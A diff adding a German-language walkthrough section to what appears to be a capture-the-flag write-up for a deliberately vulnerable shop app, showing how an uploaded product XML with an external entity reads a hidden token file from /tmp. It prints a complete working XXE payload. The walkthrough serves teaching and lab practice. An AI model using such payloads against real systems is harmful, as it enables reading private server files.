@@ -83,8 +83,51 @@ Nun kann ein neues Produkt in Form eines sauberen XML-Files zum Produkte-Katalog
     <name>Apple Iphone X</name>
     <price>1199.99</price>
 </product>
-
 ```
+
+Wodurch das neu erzeugte Produkt dem Katalog erfolgreich hinzugefügt wird:
+
+Allerdings erhält der Nutzer auch eine Textrückgabe des erzeugten XML. Der findige Spieler kann hier bereits vermuten, dass hier womöglich ungewollte Informationen abgesaugt werden können. 
+
+So wäre es doch interessant, was passiert, wenn in dem eingespielten XML eine andere Datei referenziert wird, deren Inhalt dann zurückgegeben wird.
+
+Auch die Command Execution Schwachstelle aus der ursprünglichen Implementierung wurde leicht modifiziert.
+
+Beim Listing der Files im /tmp Verzeichnis taucht nun eine weitere Datei auf:
+![alt text](https://imgur.com/tJ78LDA.png "Eine neue TOKEN_REWARD Datei wird gelistet")
+
+Allerdings kann diese, im Gegensatz zu der ursprünglichen Datei, nicht über Änderung des Kommandos auf der Browser-Konsole ausgelesen werden:
+![alt text](https://imgur.com/jOpwsvI.png "Logo Title Text XXX")
+
+Aber ein findiger Spieler findet sicher einen Weg, den neu entdeckten Upload der XML-Datei für "bösartige" Zwecke auszunützen...
+
+Und tatsächlich: wird eine bösartige XML-Datei eingespielt, welche eine externe Entität definiert, die auf das Systemkommando "/tmp/TOKEN_REWARD2.TXT" referenziert, so kann dieses Kommando ausgeführt werden.
+
+Im Gegensatz zur Command Execution, die den Zugriff auf diese Datei nicht gestattete, ist es nun möglich, den Inhalt des zweiten TOKEN_REWARD Files auszulesen.
+
+```xml
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE bar [
+<!ENTITY xxe SYSTEM "/tmp/TOKEN_REWARD2.TXT">
+]>
+<product>
+    <active>true</active>
+    <category>
+            <name>Smartphone</name>
+        <parent>
+            <name>Electro</name>
+        </parent>
+    </category>
+    <description>"A very expensive brick"</description>
+    <imagePath>images/products/IphoneX.jpg</imagePath>
+    <name>&xxe;</name>
+    <price>1199.99</price>
+</product>
+```
+
+So erhält der Nutzer eine Rückgabe, welche den Token in der Textdatei ausgibt.
+
+![alt text](https://imgur.com/XBoU2QP.png "Das Token wird zurückgegeben")
 
 
 
